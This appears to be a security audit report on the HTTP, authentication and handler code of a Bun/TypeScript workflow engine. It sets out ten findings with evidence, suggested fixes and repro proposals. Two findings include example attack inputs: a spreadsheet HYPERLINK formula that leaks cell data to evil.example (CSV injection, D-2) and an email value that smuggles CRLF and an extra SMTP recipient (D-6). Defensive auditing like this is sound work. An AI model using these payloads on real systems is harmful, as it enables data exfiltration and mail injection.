# Area D: HTTP, auth, handlers

State: HEAD `5f41cd8a`. Read in full: `src/http/server.ts`, `routes.ts`,
`admin-routes.ts`, `studio-routes.ts`, `reporting-routes.ts`,
`account-routes.ts`, `static.ts`, `metrics.ts`, `errors.ts`. Also read in full:
`src/auth/` (`authorize.ts`, `grants.ts`, `process-access.ts`, `groups.ts`,
`jwt.ts`, `login.ts`, `resolve.ts`, `users.ts`, `cli.ts`), `src/handlers/` (all
four), `src/errors.ts` and `src/log.ts`. Targeted reads in addition:
`src/runtime/internal.ts:113-206`, `src/runtime/instances.ts:100-472`,
`src/runtime/claims.ts`, `src/runtime/visibility.ts`,
`src/engine/definitions.ts:340-461`, `src/runtime/reports.ts:430-475`,
`docker/engine.Dockerfile`.

## Findings

### D-1: `POST /auth/login` throws past `mapError`; an anonymous request triggers it

- Case:
  - An anonymous caller sends `POST /auth/login` with an email value that
    Postgres rejects as a text parameter. The handler `handleLogin` checks
    only that both fields are strings (`src/auth/login.ts:130`). It counts the
    rate-limit attempt (`:142`, `:146`) and calls `verifyLogin` (`:148`).
  - The query `SELECT ... WHERE email = ${email}` (`src/auth/users.ts:91`)
    passes the value to Postgres as a text parameter. Postgres rejects it
    (assumed: a database encoding error (SQLSTATE 22021)).
  - No code catches the error. The handler `handleLogin` wraps only
    `req.json()` in a try (`login.ts:125-129`). The route closure calls it
    directly (`server.ts:561-566`). The dispatcher calls `route.handler`
    without a try (`server.ts:840`). The promise of the `fetch` handler
    rejects, and Bun answers on its own.
  - The call `Bun.serve({ fetch, port, maxRequestBodySize })` (`server.ts:901`)
    sets neither `error` nor `development`. Per
    `bun-types@1.3.14/serve.d.ts:681-684`, `development` equals
    `process.env.NODE_ENV !== 'production'`. The file `docker/engine.Dockerfile`
    sets no `NODE_ENV`.
  - In development mode Bun renders its error page with the message and the
    stack. The page holds file paths under `/app/src/...` and the Postgres
    error text. The same holds for every database outage during a login.
  - A second site of the same kind: `handleSubmit` calls `getInstanceView`
    without protection in the `AutomaticCascadeLoop` branch
    (`src/http/routes.ts:292-294`). If that call throws, the error escapes the
    same way.
- Mechanism: the ERR-3 fix (a 500 without a message, plus a server log) sits in
  `mapError` (`src/http/errors.ts:126-137`). It applies only to handlers behind
  `guarded`/`route`. The function `handleLogin` is the only table handler
  without this wrapper.
- Location: `src/auth/login.ts:117-175`, `src/http/server.ts:561-566`, `:840`,
  `:901`; `src/http/routes.ts:292-294`
- Severity: medium (unauthenticated disclosure of internal error texts and
  paths; no data, no auth bypass). Without development mode only low (a
  non-JSON 500, a log outside the `log.ts` format).
- Evidence: code path confirmed (lines above). Assumed: (a) Postgres/Bun.sql
  throws on the value from the case, (b) `oven/bun:1.3.11-slim` sets no
  `NODE_ENV`, (c) the content of the Bun error page. See repro R-1.
- Counter-evidence sought: an `error` handler or `development:` in `src/`
  (none, `git grep -n "development:" -- src` is empty). Also `NODE_ENV` in
  `docker/`, `docs/`, `.devcontainer` (no hit). Also a try/catch around the
  handler in the dispatcher (`server.ts:821-846`, none). Also a wrapper in the
  login closure (none).
- Known: related to ERR-3 (`CODE_REVIEW-2026-07-29.md:330`), fixed there for
  `mapError`. The login gap is new.
- Suggestion: wrap `handleLogin` in `guarded(req, ...)`, or wrap the login call
  in `server.ts:566`. Add `Bun.serve({ ..., development: false })` or an
  `error` handler that uses `mapError`. Optional: reject the offending value in
  `email` with a 400.

### D-2: CSV export neutralizes no formulas (CSV injection)

- Case:
  - A participant enters the value
    `=HYPERLINK("https://evil.example/?d="&A2;"Details")` into a text field of
    process P. A process owner with `system:reports` loads
    `GET /reporting/reports/:reportId/table.csv`
    (`src/http/reporting-routes.ts:252-262`).
  - The function `csvCellText` writes the value unchanged
    (`src/runtime/reports.ts:456`). The function `csvField` quotes only on
    `"`, `,`, CR and LF (`:436-438`). The cell starts with `=`, and Excel or
    LibreOffice evaluates it as a formula on open.
- Location: `src/runtime/reports.ts:436-438`, `:453-475`; route
  `src/http/reporting-routes.ts:252-262`
- Severity: medium (a realistic trigger: every participant writes text, and the
  owner opens the file. The effect depends on the spreadsheet software and its
  warnings.)
- Evidence: confirmed (code read). Repro R-2 shows it without a browser.
- Counter-evidence sought: escaping for a leading `=`, `+`, `-`, `@` or TAB in
  `reports.ts` (none). The spec `reporting-data-tables`, requirement "A saved
  report's table downloads as CSV"
  (`openspec/specs/reporting-data-tables/spec.md:128-181`, no formula rule).
  Also `docs/decisions.md` and the review archive (`git grep -i formula` is
  empty).
- Known: new
- Suggestion: in `csvField`, prefix with `'` every cell that starts with `=`,
  `+`, `-`, `@`, TAB or CR. This changes exported values. The spec demands
  "identical row and column set" (`reporting-data-tables/spec.md:141`). That
  needs an OpenSpec change with a delta on `reporting-data-tables`.

### D-3: `instance.transition` takes the target instance from freely editable participant data

- Case:
  - Process A carries an `instance.transition` action in `onPath` that targets
    process B. The action reads the target id from `fld_target`, a plain text
    field without `dataSource`. The field is editable on the step.
  - Participant T of A enters the id `inst_X` of a B instance and submits. T
    may neither see nor edit that instance.
  - The handler reads `acting.data[fld_target]`
    (`src/handlers/instance-transition.ts:68`). It checks only
    `target.processId === config.processId` (`:77-81`). It also checks the
    status, the current step and the manual trigger (`:90-110`).
  - The handler then drives `inst_X` as `SYSTEM_ACTOR` across the configured
    path (`:131`). That bypasses the claim, the candidacy and the visibility of
    `inst_X`. A guard on the path sees only the system actor.
- Mechanism:
  - Publish checks only that `instanceIdField` lies in the catalog of A
    (`src/engine/definitions.ts:401-406`). It also checks that the publishing
    author holds `read` on B (`:448-461`).
  - Nothing requires that the field binds an `instance.query` source on B. Only
    that binding lets the option check on submit (`src/runtime/fields.ts:547`,
    `:576`) limit the value to permitted instances.
  - The reader list of B can also grant `read` on B
    (`src/auth/authorize.ts:128-136`). Per `process-access-roles` that list
    means "standing read access". Here it unlocks a write effect on B.
- Location: `src/handlers/instance-transition.ts:62-143`,
  `src/engine/definitions.ts:401-406`, `:448-461`
- Severity: medium (precondition: the author binds the field freely, and the
  participant knows a target id. Instance ids are UUIDv4, but a participant
  can still know one. Sources include own cases, comments or `instance.query`
  options of other steps.)
- Evidence: confirmed in code. Exploitability depends on the published body
  (repro R-3).
- Counter-evidence sought: the publish checks (`definitions.ts:373-461`). The
  spec `instance-transition-action`
  (`openspec/specs/instance-transition-action/spec.md:37-60`: "That field's
  value at delivery time is the target instance's id", no binding rule). The
  handler checks (`instance-transition.ts:65-110`). No check of `target.kind`
  against `acting.kind`.
- Known: new
- Suggestion: a publish rule "`instanceIdField` carries an `instance.query`
  source with `config.processId` equal to the action's". The option check then
  applies. Alternative: a delivery check that `inst_X` belongs to the option
  set. The rule touches `cross-process-validation`/`instance-transition-action`
  and `.claude/rules/authoring-invariants.md`, so it needs an OpenSpec change.

### D-4: `notification.email` reaches its `ponytail:` limit: group candidates unbounded, all-or-nothing

- Case:
  - Step S has `assignment.strategy.type: "org.group-members"` on a group with
    300 members. The function `setGroupMembers` does not cap the list
    (`src/http/admin-routes.ts:438-447`).
  - A `notification.email` action with `toActors: ["candidate"]` produces 300
    `RCPT TO` in one session (`src/handlers/notification-email.ts:315-319`). It
    also writes a `To:` header with all 300 addresses (`:241`).
  - A relay with a recipient limit answers 452 from that limit on. RFC 5321
    demands only 100. The handler treats 452 as transient (`:106`), so the row
    retries until dead letter. A 5xx makes it permanent at once. In both cases
    nobody gets the mail, because the handler aborts before `DATA`.
  - The marker (`:352-357`) names its limit: "Cap it here if a strategy ever
    resolves an unbounded directory group". Its reason reads "the two shipped
    strategies produce a configured list or one manager". Today four
    strategies ship. Two of them resolve whole groups: `org.group-members` and
    the `group_` branch of `org.actor-from-field`
    (`src/engine/assignment-strategies.ts:61`, `:80`, `:113`).
- Location: `src/handlers/notification-email.ts:352-366`, `:315-319`, `:241`
- Severity: low (an effect only with large groups and a relay limit; formally,
  the code reaches the marker's limit)
- Evidence: code confirmed; the relay behavior stays an assumption (repro R-4).

<!-- antislop: allow passive-voice -->
<!-- The spec rule is a verbatim English quote from the spec and stays as written. -->
- Counter-evidence sought: a cap on the candidate list in the strategies or
  in `setGroupMembers` (none). The spec rule "Every recipient is accepted
  before the message is sent" (Refused simplification 47, the entry at
  `docs/decisions.md:1832-1840`) still holds. It forces the all-or-nothing.

- Known: new (the marker itself is the only entry)
- Suggestion: cap the candidates at an upper bound, or split them into batches
  of at most 100 recipients per session. Align the marker text with the new
  bound. This touches the
  spec `notification-email-action-handler`, so it needs an OpenSpec change.

### D-5: The developer list does not apply to the two publish routes

- Case:
  - Author U holds `system:author` and global `system:publish`. U is not on
    the developer list of `proc_P` (team B). The route `GET /drafts/proc_P`
    answers U with 403 (`src/http/studio-routes.ts:147-150`).
  - The route `POST /drafts/proc_P/publish` checks only `requireAuthoring` and
    `requirePermission(..., "publish", ...)` (`:312-315`). It publishes the
    unfinished draft of team B.
  - The route `POST /processes` checks only the publish permission
    (`src/http/routes.ts:655`). It publishes any body under `proc_P`.
- Location: `src/http/studio-routes.ts:299-336`, `src/http/routes.ts:638-668`
- Severity: low. The code follows the spec: `studio-publish/spec.md:24-29` and
  `authorization/spec.md:279-282` name only "the four draft routes". The
  purpose sentence of `process-access-roles/spec.md:6` contradicts them: "A
  Developer edits and publishes the process". The owner has to decide.
- Evidence: confirmed (code and specs read)
- Counter-evidence sought: a developer-list check in
  `publishBody`/`handlePublishDraft` (none). An entry in `docs/decisions.md`
  (absent; `grep -i "developer list"` finds only `:265`, a different point).
- Known: new
- Suggestion: record the owner's decision. If wanted, add a developer-list
  check for non-admins in both publish routes, as an OpenSpec change.

### D-6: The account email is never checked as an address; CRLF reaches the SMTP command and the `To:` header

- Case:
  - An operator adds an account through `POST /admin/users` with
    `email: "a@x.ch>\r\nRCPT TO:<leak@evil.example"`. The route checks only
    "string, not empty after trim" (`src/http/admin-routes.ts:189-193`,
    `:212`).
  - The function `createUser` stores the value verbatim
    (`src/auth/users.ts:65-69`). The table has no CHECK
    (`src/engine/store.ts:383-389`).
  - Suppose the account stands as a candidate in a `toActors` notification.
    The address then lands unfiltered in `RCPT TO:<${address}>\r\n`
    (`src/handlers/notification-email.ts:317`) and in `To:` (`:241`).
  - The harmless case is more realistic. A typo such as `max.muster` without a
    domain draws a 5xx on `RCPT`. The whole mail to all candidates then fails
    (all-or-nothing, `:311-319`).
- Location: `src/http/admin-routes.ts:209-232`, `src/auth/users.ts:65-69`,
  `src/handlers/notification-email.ts:241`, `:315-319`
- Severity: low (only `system:admin` and the CLI write emails)
- Evidence: confirmed (code). The schema `z.string().email()` protects literal
  `to` addresses (`:55`). RFC-2047 encoding protects the subject for non-ASCII
  text (`:212-215`).
- Counter-evidence sought: email validation in `cli.ts`, `users.ts`,
  `admin-routes.ts` and the DB schema (none).
- Known: new
- Suggestion: check the email format in `createUser` (reject CR, LF and `<>`).
  Filter defensively in `resolveRecipients` as well.

### D-7: Existence and status oracle for instance ids on write routes

- Case:
  - Any signed-in actor calls `POST /instances/inst_X/visibility/grant`. If
    `inst_X` does not exist, `loadInstanceForRead` throws `NotFoundError`
    (`src/runtime/internal.ts:115`). The function `mapError` returns it as a 500
    with the text "instance not found: inst_X" (`src/http/errors.ts:97`). If it
    exists, a 403 follows (`src/runtime/visibility.ts:42-44`).
  - The routes `POST /instances/inst_X/submit` and `PUT .../draft` report
    `InstanceNotRunningError` with its status before any permission check. The
    status is `completed`, `cancelled` or `faulted`
    (`src/runtime/instances.ts:324`, `:274` before `:275-280`).
  - The read path, in contrast, collapses on purpose into one uniform 403
    (`internal.ts:161-163`, `:176-180`). The comment `visibility.ts:30-33`
    ("learns nothing an unauthorized read would not already tell them") is
    therefore wrong.
- Location: `src/runtime/visibility.ts:30-44`, `src/runtime/instances.ts:274`,
  `:314`, `:324`, `:366-368`
- Severity: low (ids are UUIDv4; only existence and status leak)
- Evidence: confirmed (code)
- Counter-evidence sought: a fold into 403 on these paths (only in
  `cancelInstance` `:459-465` and in `loadInstanceForActor`).
- Known: new
- Suggestion: fold the `loadInstanceForRead` error in `changeVisibility` into
  `AuthorizationError`, as `cancelInstance` does. Move the status check behind
  the authority check.

### D-8: JWT hardening: no algorithm list, no required `exp` for external issuers

- Case:
  - A misconfigured external IdP issues a token without `exp`. The call
    `jwtVerify(token, jwks, { issuer, audience })` (`src/auth/jwt.ts:133`)
    checks `exp` only when present. The token then stays valid without limit.
    The check `isActiveAccount` does not run for external tokens (`:75-77`,
    `:126-134`).
  - The local branch sets no `algorithms` (`:115`). With a `Uint8Array` key,
    jose admits only HS256/384/512 and never `none`. No confusion is possible.
- Location: `src/auth/jwt.ts:115`, `:133`
- Severity: low (hardening only; it presumes a faulty IdP)
- Evidence: confirmed (code); the jose behavior comes from knowledge of jose 6.
- Counter-evidence sought: `requiredClaims`/`maxTokenAge` (none).
- Known: new
- Suggestion: `algorithms: ["HS256"]` locally. For external issuers,
  `requiredClaims: ["exp"]` and an algorithm list.

### D-9: Doc and spec drift in the area

- `src/auth/cli.ts:2-3`:
  `the only way to create a local BPS user or change its password; no HTTP route does either`.
  That is wrong since `POST /admin/users`
  (`src/http/admin-routes.ts:209`) and `POST /admin/users/:userId/password`
  (`:250`). The file `src/auth/users.ts:8-9` claims that the CLI header names
  the routes. Known: DOC-1 (`CODE_REVIEW-2026-07-29.md:432`), listed as done,
  drifted again.
- `src/auth/authorize.ts:11` says "Seven gated operations", and `:14` says
  "four fixed permissions". The table `PERMISSION_ROLE` holds five entries
  (`:103-109`). Known: the risk class of CQ-2 (`docs/decisions.md:824`). The
  site is new.
- `openspec/specs/authorization/spec.md:287-291`: the scenario "admits no fifth
  value" contradicts the requirement `:181` and the code (`authorize.ts:84`
  with `"visibility"`). New.
- `openspec/specs/process-access-roles/spec.md:15-17`: the entry "SHALL be a
  `user_xxx` id or a `group_xxx` id". The code accepts any non-empty string
  (`src/http/studio-routes.ts:502-505`). New.
- `src/runtime/visibility.ts:30-33`: see D-7.
- Severity: low. Evidence: confirmed. Suggestion: correct the comments. Align
  the two spec sites through an OpenSpec change.

### D-10: Dead or needless exports

- `InstanceTransitionConfig` (`src/handlers/instance-transition.ts:39`): no hit
  besides the declaration in `src/ packages/ test/ scripts/ e2e/`
  (`git grep -w`).
- `referencingPublishedProcesses` (`src/auth/groups.ts:182`): used only in its
  own file (`:203`), no importer.
- Severity: low. Evidence: `git grep -w` (LSP unavailable, see "Not checked").
  Known: new. It matches the practice from Refused simplification 41
  (`docs/decisions.md:1793-1800`: a symbol without an importer loses its
  `export`). Suggestion: remove the `export`, or delete the type.

## Checked without a finding

### Route table (replacement for TEST-1)

The function `createServer` holds 90 entries (`src/http/server.ts:558-762`).
Three dispatcher routes come on top. Tenant: for every table route the
dispatcher picks the database from the token claim or the host
(`server.ts:826-839`, `:455`). The resolver then checks the signature. The
signature covers the `tenant` claim or `iss` (`src/auth/jwt.ts:21-45`, `:115`,
`:133`).

For local tokens the resolver also checks the account in that tenant database
(`:121`). A separate tenant check per route is therefore unnecessary. The
column "Gate" names the role or permission check. The column "Object" names
the check on the instance, process or report.

| Route | Handler | Gate | Object | Verdict |
|---|---|---|---|---|
| `GET /livez` | `server.ts:517` | none (intended) | - | ok, body `{status:"ok"}` |
| `GET /readyz` | `server.ts:521` | none (intended) | - | ok, only ok/unavailable |
| `GET /metrics` | `server.ts:804-809` | Bearer = `METRICS_TOKEN`, constant-time (`:320-328`); if unset, the route is absent | - | ok |
| `POST /auth/login` | `login.ts:117` | none (intended), registered only with `AUTH_JWT_SECRET` (`server.ts:559`) | - | D-1 |
| `GET /ui-strings` | `admin-routes.ts:846` | none (intended, spec) | - | ok |
| `POST /processes/:id/instances` | `routes.ts:245` | session | no start restriction (spec: `end-user-app` `/start` lists all) | ok per spec |
| `GET /instances` | `routes.ts:457` | scope absent/all: ADMIN or `read` (`:472-483`); mine/started/visible derived from the actor (`:490-538`) | - | ok |
| `GET /instances/:id` | `routes.ts:261` | session | `loadInstanceForActor` (`internal.ts:170-206`) | ok |
| `POST …/submit` | `routes.ts:275` | session | `requireSubmitAuthority` (`instances.ts:333`) | ok, D-7 |
| `PUT …/draft` | `routes.ts:300` | session | `requireSubmitAuthority` (`instances.ts:368`) | ok, D-7 |
| `POST …/claim` | `routes.ts:309` | session | candidacy (`engine/transition.ts:1076-1081`) | ok |
| `POST …/release` | `routes.ts:317` | session | claimant (`transition.ts:1098`) | ok |
| `POST …/delegate` | `routes.ts:325` | session | claimant (`transition.ts:1132`) | ok |
| `GET/POST …/comments` | `routes.ts:343/334` | session | `loadInstanceForActor` (`comments.ts:71`/`:44`) | ok |
| `GET/POST …/attachments` | `routes.ts:372/354` | session | `loadInstanceForActor` (`attachments.ts:85`/`:50`) | ok |
| `GET …/attachments/:aid` | `routes.ts:384` | session | `loadInstanceForActor` (`attachments.ts:130`) | ok |
| `GET …/record` | `routes.ts:548` | ADMIN or the loaded branch (`record.ts:48-59`) | yes | ok |
| `POST …/cancel` | `routes.ts:559` | CANCEL_ANY or `can(cancel)`/starter (`instances.ts:441-471`) | yes | ok |
| `POST …/visibility/{revoke,restore,grant}` | `routes.ts:589-614` | `can(visibility)` (`visibility.ts:42-44`) | yes | ok, D-7 |
| `GET /processes` | `routes.ts:670` | session | - | ok per spec (`admin-app/spec.md:837-838`) |
| `POST /processes` | `routes.ts:638` | `requirePermission(publish)` (`:655`) | - | D-5 |
| `GET /processes/:id/versions` | `routes.ts:677` | session | - | ok per spec (`authorization/spec.md:1192`) |
| `GET/PATCH /account/me` | `account-routes.ts:62/113` | session, self-scoped | own id | ok |
| `/admin/outbox`, `/timers`, `/users*`, `/groups*`, `/migrations/run`, `/instances/:id/{redact,audit,audit/verify}`, `/ui-strings`, `/permission-grants*` (29 routes) | `admin-routes.ts:86-920` | `requireRole(ADMIN)` per handler | global | ok |
| `GET /admin/data-lists`, `GET …/:listKey` | `admin-routes.ts:667/708` | DATALISTS or DEVELOPER or AUTHOR (`:505-508`) | global | ok |
| `POST/PUT/DELETE /admin/data-lists*` (4) | `admin-routes.ts:684/724/763/790` | `requireRole(DATALISTS)` | global | ok |
| `GET /reporting/processes` | `reporting-routes.ts:112` | REPORTS | - | ok |
| `GET /reporting/:pid/{cycle-time,bottleneck,sla}` | `reporting-routes.ts:140` | REPORTS + `read` (`:130-133`) | process | ok |
| `/reporting/reports*` (9) | `reporting-routes.ts:176-285` | REPORTS | `getReport`/`executeReport`/preview in the runtime (not read in D) | ok at the HTTP edge, D-2 |
| `GET /drafts` | `studio-routes.ts:121` | ADMIN or authoring, filtered by the developer list | yes | ok |
| `GET/PUT/DELETE /drafts/:pid`, `POST …/instances` | `studio-routes.ts:138/169/206/250` | new draft: authoring (+`CREATE` on PUT); otherwise developer list or ADMIN | yes | ok |
| `POST /drafts/:pid/publish` | `studio-routes.ts:299` | authoring + `publish` | no developer list | D-5 |
| `GET /processes/:pid/versions/:v` | `studio-routes.ts:352` | `requireStudioRead` | - | ok per comment/spec |
| `GET/PUT /migration-plans/…`, `GET …/orphan-keys` | `studio-routes.ts:371/389/408` | `migrate` | process | ok |
| `GET /registry` | `studio-routes.ts:446` | authoring | - | ok |
| `GET /templates`, `/templates/:k` | `studio-routes.ts:471/477` | `requireStudioRead` | - | ok |
| `PUT/DELETE /templates/:k` | `studio-routes.ts:485/493` | TEMPLATES | - | ok |
| `GET /processes/:pid/access` | `studio-routes.ts:523` | ADMIN or developer list | process | ok |
| `PUT/DELETE /processes/:pid/access` | `studio-routes.ts:545/554` | in `requireWriteAccess` (`process-access.ts:63-68`) | process | ok |
| `GET /processes/access/mine` | `studio-routes.ts:569` | session, self-scoped | - | ok |

The audit found no route without a check. The session-only routes match the
specs. Every `route()` call awaits its gate (`routes.ts:238-242`). The tree
`src/` has no un-awaited `can`/`requirePermission`/`matchesAccessList`
(`git grep`).

### Further check questions

- Logic of `authorize.ts`/`grants.ts`/`process-access.ts`: default deny
  everywhere. An unknown permission yields `includes(undefined)` = false
  (`authorize.ts:126`). Empty roles give no grant (`grants.ts:52`). An empty
  list gives no match (`process-access.ts:45`). The role comparison is exact,
  through `includes`. The audit found no fallthrough.
- Dev-header auth applies only when neither `AUTH_JWT_SECRET` nor
  `AUTH_ISSUERS` is set AND `ALLOW_INSECURE_DEV_AUTH === "1"`
  (`server.ts:404-410`). Otherwise the startup aborts (`:411-413`). With a
  secret set, JWT always wins. The only setter is
  `.devcontainer/docker-compose.yml:47`, and the production image inherits
  nothing. The audit confirms SEC-10 (`docs/decisions.md:742`).
- Without `AUTH_JWT_SECRET`: no default value, and the login route stays
  unregistered (`server.ts:559-566`). The minimum length is 32 bytes
  (`server.ts:378`, `:415-419`). The value `AUTH_ISSUERS="[]"` yields a
  resolver that rejects everything (fail closed).
- Password hashing: `Bun.password.hash` (argon2id, Bun default cost)
  (`users.ts:67`, `:140`, `:236`). Timing: exactly one `verify` on every path,
  with a dummy hash for an unknown email (`users.ts:80`, `:100`). Rate limit
  per email and address (`login.ts:136-146`). SEC-5 (`docs/decisions.md:624`)
  stays open, with the marker `login.ts:49`. Per the runbook, the code
  reaches the marker's limit, and the runbook already notes it.
- `exp`/`nbf`/`iss`/`aud`: locally the resolver checks `issuer`, and `exp` is
  always set (`login.ts:168`). Externally it checks `issuer`+`audience`
  (`jwt.ts:133`). See D-8. The audit confirms SEC-9
  (`docs/decisions.md:653`, roles from the token) (`jwt.ts:117-124`).
- `/metrics`, `/livez`, `/readyz`: no tenant names, no versions, no DB details.
  The route `/metrics` returns only counters, behind a token
  (`metrics.ts:34-42`).
- Email header injection: the subject is safe (`notification-email.ts:212-215`,
  CR/LF force Base64). The body is Base64 (`:226-231`). Zod email validation
  covers `to` (`:55`). The header `From` comes from the environment. For the
  rest see D-6.
- SSRF in `http.request`: an allowlist per host, default empty, which denies
  everything (`http.ts:81-99`). Only https without an opt-in (`:88`),
  `redirect: "manual"` (`:175`), a bounded response size (`:121-144`). The URL
  is static in the body, with no interpolation of instance data
  (`outbox.ts:100`). Only authors with the publish right set it. DNS rebinding
  works only through a host the operator allowed.
- Path traversal in `static.ts`: decode, resolve, prefix check with `sep`
  (`static.ts:63-74`), NUL rejected (`:70`). A backslash under Windows falls
  under `resolve` plus the prefix check. Symlinks follow `statSync`, and the
  build controls the content of `dist`. Attachments live in the database, with
  no path.
- Attachments and XSS, the SEC-8 assumptions (`docs/decisions.md:719`): they
  hold. The server sends `nosniff` plus `Content-Disposition: attachment` with
  a percent-encoded name (`server.ts:200-213`), and `MIME_TOKEN_PAIR` applies
  (`routes.ts:108-111`). A download needs a bearer header. The SPA saves
  through a Blob and `<a download>` and revokes at once
  (`packages/web/src/areas/app/screens/TaskScreen.tsx:402-411`). No other SPA
  path renders attachments (`git grep createObjectURL|window.open`). CSP
  `script-src 'self'` (`packages/web/csp.ts:23`), `frame-ancestors` per header
  (`static.ts:39-44`).
- Body size (the old SEC-10 from 2026-07-29): `maxRequestBodySize` 8 MiB
  (`server.ts:867`, `:901`). An attachment holds at most 5 MiB decoded
  (`routes.ts:82`, `:359`). A comment holds at most 10 000 characters
  (`routes.ts:72-75`).
- 500 fallback (the old ERR-3): free of a message, with a log
  (`errors.ts:126-137`). Exceptions: `NotFoundError`/`PinMismatch` carry text on
  a 500 (`errors.ts:96-97`), intended per the comment `:12-16`. The gap outside
  `mapError` is D-1.
- CORS: no headers by default (`server.ts:146-151`, `:162`). The allowlist
  matches exactly, with `Vary: Origin` (`:164-167`). A `*` origin goes without
  credentials. The routes `/livez`, `/readyz` and `/metrics` have no CORS
  headers (`:790-809`).
- Secrets in the code: none. The values `AUTH_JWT_SECRET`, `METRICS_TOKEN` and
  `SMTP_*` come only from the environment. The dummy hash is random
  (`users.ts:80`).
- ARCH-2 (`docs/decisions.md:818`): all three binary handlers (attachment, CSV,
  metrics) stand in `BINARY_ROUTES` (`server.ts:272-276`). It is still open as
  described.
- SEC-2 (`docs/decisions.md:598`) and SEC-3 (`:612`) remain open, unchanged
  (`admin-routes.ts:189-193`, `:250-258`; `account-routes.ts:31`). CQ-2
  (`:824`) stays unchanged (`authorize.ts:29-60`).
- Simplification: the hand-written router already has an entry
  (`docs/decisions.md:507`, Refused 48). The audit does not report it again.

## Repro proposals

- R-1 (D-1):
  - Start the container with `AUTH_JWT_SECRET` (at least 32 bytes) and without
    `NODE_ENV`. Send a login request whose email value Postgres rejects as a
    text parameter.
  - Expected per the finding: no JSON envelope, but HTTP 500 with the Bun error
    page. The page is HTML with the Postgres message and a stack from
    `src/auth/users.ts`. Counter-check with `NODE_ENV=production`: a 500
    without details.
  - A test without a container: `createServer(...)` with `loginSecret` and a
    `db` whose query throws. Per the finding,
    `await fetch(new Request(".../auth/login", {method:"POST", body}))` must
    reject. It must not deliver `{status:500, body:{error:{type:"internal"}}}`.
  - In addition: `docker run --rm oven/bun:1.3.11-slim env | grep NODE_ENV`.
- R-2 (D-2): a unit test:
  `reportResultToCsv({columns:[{type:"field",fieldId:"f"}], rows:[{cells:[{kind:"value", value:"=1+1"}]}]})`
  (adapt the shape to `ReportExecutionResult`). Expected per the finding: the
  line `=1+1\r\n` without a prefix.
- R-3 (D-3): a process B with a manual path. A process A whose
  `instance.transition` action reads its target id from a free text field. The
  author of A holds `read` on B. Expected per the finding: a participant moves
  a B instance past that path. The participant has no role and is not a
  candidate in B. The record then shows the event
  `instance.transitioned-by-action`.
- R-4 (D-4): an SMTP stub that answers `452 4.5.3 Too many recipients` from the
  101st `RCPT` on. A group with 150 active members as `org.group-members`. An
  action with `toActors:["candidate"]`. Expected per the finding: no `DATA`, a
  transient error, and retries until dead letter.

## Not checked

- LSP references: the LSP tool does not start
  (`TypeScript 7.0.2 ... provides no tsserver.js`). The audit therefore checked
  dead exports only with `git grep -w` over `src packages test scripts e2e`
  (D-10).
- The object checks of the reports (`getReport`, `executeReport`,
  `previewReportDraft` in `src/runtime/reports.ts`) and the claim logic in the
  engine core: verified only at the call site. The deep check belongs to
  another area.
- Bun behavior (the error page in development mode, the D-1 value in
  parameters): not checked by a run. The same holds for the `NODE_ENV` of the
  base image. The audit allowed no runs. See R-1.
- `docker/nginx.conf` and the frontend image (security headers there): not
  read.
